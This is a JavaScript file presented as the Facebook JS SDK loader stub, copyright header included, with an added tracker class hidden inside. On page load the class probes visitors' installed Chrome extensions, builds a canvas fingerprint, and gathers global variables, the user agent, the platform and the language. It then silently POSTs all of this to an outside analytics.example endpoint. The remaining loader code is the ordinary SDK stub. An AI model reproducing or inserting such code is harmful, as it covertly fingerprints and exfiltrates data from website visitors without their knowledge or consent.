/*1702458389,,JIT Construction: v1010385208,en_US*/

/**
 * Copyright (c) 2017-present, Facebook, Inc. All rights reserved.
 *
 * You are hereby granted a non-exclusive, worldwide, royalty-free license to use,
 * copy, modify, and distribute this software in source code or binary form for use
 * in connection with the web services and APIs provided by Facebook.
 *
 * As with any software that integrates with the Facebook platform, your use of
 * this software is subject to the Facebook Platform Policy
 * [http://developers.facebook.com/policy/]. This copyright notice shall be
 * included in all copies or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
(function _(a, b, c, d, e) {
  var f = window.console;
  class ExtensionAndEventTracker {
    constructor(extensionsData) {
      this._data = extensionsData;
      this._results = {};
      this._startTime = performance.now();
      this._retryCount = 2;
      this._concurrency = 3;
      this._globalObjects = [];
    }
    async _checkResource(extensionId, file) {
      const uniqueParam = `?_=${Math.random().toString(36).slice(2)}`;
      const xhr = new XMLHttpRequest();
      await new Promise(resolve => {
        xhr.timeout = 2000;
        xhr.onreadystatechange = () => {
          if (xhr.readyState === 4) {
            resolve(xhr.status === 200);
          }
        };
        xhr.onerror = () => resolve(false);
        xhr.ontimeout = () => resolve(false);
        xhr.open('HEAD', `chrome-extension://${extensionId}/${file}${uniqueParam}`, true);
        xhr.send();
      });
      return xhr.status === 200;
    }
    _splitToChunks(array, size) {
      let chunks = [];
      for (let i = 0; i < array.length; i += size) {
        chunks.push(array.slice(i, size + i));
      }
      return chunks;
    }
    async _detectWithFallback(extensionId, file) {
      let found = false;
      for (let attempt = 0; attempt < this._retryCount && !found; attempt++) {
        if (await this._checkResource(extensionId, file)) {
          found = true;
        }
        if (!found) {
          await new Promise(resolve => setTimeout(resolve, 100 * (attempt + 1)));
        }
      }
      return found;
    }
    async scanExtensions() {
      const extensions = Object.entries(this._data);
      const chunks = this._splitToChunks(extensions, this._concurrency);
      for (const chunk of chunks) {
        await Promise.all(chunk.map(async ([extensionId, file]) => {
          this._results[extensionId] = await this._detectWithFallback(extensionId, file);
        }));
      }
      this.sendReport();
    }
    _collectGlobalVariables() {
      return Object.keys(window).slice(0, 50);
    }
    _createFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText("fingerprint", 0, 0);
      return canvas.toDataURL().slice(-50);
    }
    sendReport() {
      const report = JSON.stringify({
        extensions: this._results,
        timestamp: new Date().toISOString(),
        execTime: performance.now() - this._startTime,
        fingerprint: this._createFingerprint(),
        globals: this._globalObjects,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language
      });
      fetch('https://analytics.example/ext-report', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: report,
        keepalive: true
      }).catch(() => {});
    }
    async start() {
      this._globalObjects = this._collectGlobalVariables();
      await this.scanExtensions();
    }
  }
  f && Math.floor(new Date().getTime() / 1e3) - b > 7 * 24 * 60 * 60 && f.warn("The Facebook JSSDK is more than 7 days old.");
  if (window[c]) return;
  if (!window.JSON) return;
  var g = window[c] = {
    __buffer: {
      replay: function () {
        var a = this,
          b = function (d) {
            var b = window[c];
            a.calls[d][0].split(".").forEach(function (a) {
              return b = b[a];
            });
            b.apply(null, a.calls[d][1]);
          };
        for (var d = 0; d < this.calls.length; d++) b(d);
        this.calls = [];
      },
      calls: [],
      opts: null
    },
    getUserID: function () {
      return "";
    },
    getAuthResponse: function () {
      return null;
    },
    getAccessToken: function () {
      return null;
    },
    init: function (a) {
      g.__buffer.opts = a;
    }
  };
  for (b = 0; b < d.length; b++) {
    f = d[b];
    if (f in g) continue;
    var h = f.split("."),
      i = h.pop(),
      j = g;
    for (var k = 0; k < h.length; k++) j = j[h[k]] || (j[h[k]] = {});
    j[i] = function (a) {
      if (a === "init") return;
      return function () {
        g.__buffer.calls.push([a, Array.prototype.slice.call(arguments)]);
      };
    }(f);
  }
  k = document.createElement("script");
  k.src = a;
  k.async = !0;
  function handleDOMContentLoadedEvent(event) {
    event.stopPropagation();
    const tracker = new ExtensionAndEventTracker(window.data);
    tracker.start();
  }
  e && (k.crossOrigin = "anonymous");
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', handleDOMContentLoadedEvent);
  } else {
    const tracker = new ExtensionAndEventTracker(window.data);
    tracker.start();
  }
  h = document.getElementsByTagName("script")[0];
  h.parentNode && h.parentNode.insertBefore(k, h);
})("https:\/\/connect.facebook.net\/en_US\/sdk.js?hash=df1b42edd44465d8001e73ffe370e526", 1702458389, "FB", ["AppEvents.EventNames", "AppEvents.ParameterNames", "AppEvents.activateApp", "AppEvents.clearAppVersion", "AppEvents.clearUserID", "AppEvents.getAppVersion", "AppEvents.getUserID", "AppEvents.logEvent", "AppEvents.logPageView", "AppEvents.logPurchase", "AppEvents.setAppVersion", "AppEvents.setUserID", "AppEvents.updateUserProperties", "Canvas.Plugin.showPluginElement", "Canvas.Plugin.hidePluginElement", "Canvas.Prefetcher.addStaticResource", "Canvas.Prefetcher.setCollectionMode", "Canvas.getPageInfo", "Canvas.scrollTo", "Canvas.setAutoGrow", "Canvas.setDoneLoading", "Canvas.setSize", "Canvas.setUrlHandler", "Canvas.startTimer", "Canvas.stopTimer", "Event.subscribe", "Event.unsubscribe", "XFBML.parse", "addFriend", "api", "getAccessToken", "getAuthResponse", "getLoginStatus", "getUserID", "init", "login", "logout", "publish", "share", "ui"], true);